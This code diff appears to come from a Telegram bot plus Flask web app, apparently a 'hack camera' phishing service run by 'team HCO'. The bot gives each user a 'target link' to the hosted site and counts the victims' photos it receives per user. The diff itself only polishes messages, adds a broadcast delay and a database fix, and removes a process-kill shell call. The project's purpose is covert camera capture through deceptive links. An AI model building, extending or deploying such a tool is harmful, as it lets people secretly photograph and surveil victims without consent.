@@ -1,18 +1,10 @@
-import os, base64, threading, sqlite3, time, telebot, signal
+import os, base64, threading, sqlite3, time, telebot
 from flask import Flask, render_template, request, jsonify
 from telebot import types
 
-def kill_old_processes():
-    try:
-        current_pid = os.getpid()
-        os.system(f"pgrep -f app.py | grep -v {current_pid} | xargs kill -9")
-    except:
-        pass
-
-kill_old_processes()
-
 app = Flask(__name__)
 
+# --- Configuration ---
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 APP_URL = "https://happy-wishing-you.onrender.com" 
 ADMINS = [518067190, 7162565886]
@@ -24,9 +16,17 @@ bot = telebot.TeleBot(BOT_TOKEN)
 def db_init():
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
+    # Create tables if not exist
     cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, photo_count INTEGER DEFAULT 0)')
     cursor.execute('CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, total_photos INTEGER DEFAULT 0)')
     cursor.execute('INSERT OR IGNORE INTO stats (id, total_photos) VALUES (1, 0)')
+    
+    # Auto-fix for old database structure (adding column if missing)
+    try:
+        cursor.execute('ALTER TABLE users ADD COLUMN photo_count INTEGER DEFAULT 0')
+    except sqlite3.OperationalError:
+        pass # Column already exists
+        
     conn.commit()
     conn.close()
 
@@ -63,13 +63,14 @@ def show_camera_menu(chat_id):
     markup.row(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
     bot.send_message(chat_id, "<b>Select your camera mode to hack camera 📸:</b>", parse_mode='HTML', reply_markup=markup)
 
+# --- Admin Commands ---
 @bot.message_handler(commands=['stats'])
 def total_stats(message):
     if message.chat.id in ADMINS:
         conn = sqlite3.connect('users.db'); cursor = conn.cursor()
         cursor.execute('SELECT total_photos FROM stats WHERE id = 1')
         total = cursor.fetchone()[0]
-        bot.reply_to(message, f"📊 <b>Total Photos:</b> {total}", parse_mode='HTML')
+        bot.reply_to(message, f"📊 <b>Total Photos Received:</b> {total}", parse_mode='HTML')
 
 @bot.message_handler(commands=['users'])
 def user_list(message):
@@ -79,7 +80,7 @@ def user_list(message):
         rows = cursor.fetchall()
         response = "👥 <b>User Activity List:</b>\n\n"
         for row in rows:
-            response += f"👤 ID: <code>{row[0]}</code> | 📸: {row[1]}\n"
+            response += f"👤 ID: <code>{row[0]}</code> | 📸 Photos: {row[1]}\n"
         bot.reply_to(message, response, parse_mode='HTML')
 
 @bot.message_handler(commands=['broadcast'])
@@ -88,17 +89,18 @@ def broadcast(message):
         msg_parts = message.text.split(None, 1)
         msg_text = msg_parts[1] if len(msg_parts) > 1 else ""
         if not msg_text:
-            bot.reply_to(message, "Usage: /broadcast [Message]")
+            bot.reply_to(message, "Usage: /broadcast [Your Message]")
             return
         conn = sqlite3.connect('users.db'); cursor = conn.cursor()
         cursor.execute('SELECT id FROM users'); users = cursor.fetchall(); conn.close()
-        count = 0
+        success = 0
         for user in users:
             try:
                 bot.send_message(user[0], msg_text)
-                count += 1
+                success += 1
+                time.sleep(0.1)
             except: pass
-        bot.send_message(message.chat.id, f"📢 Sent to {count} users.")
+        bot.send_message(message.chat.id, f"📢 Broadcast Sent to {success} users.")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -113,7 +115,7 @@ def callback_query(call):
         if is_user_joined(user_id):
             mode = call.data.replace("m_", "")
             target_link = f"{APP_URL}/?m={mode}&uid={user_id}"
-            bot.send_message(user_id, f"<b>🤠 It's Your target link 🔗</b>\n\nUrl = {target_link}\n\n✨ Thank you team HCO ✨", parse_mode='HTML', disable_web_page_preview=True)
+            bot.send_message(user_id, f"<b>🤠 Your target link 🔗</b>\n\nUrl = {target_link}\n\n✨ Thank you team HCO ✨", parse_mode='HTML', disable_web_page_preview=True)
 
 @app.route('/')
 def index():
@@ -152,4 +154,4 @@ if __name__ == "__main__":
             except: time.sleep(5)
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
-        
+    
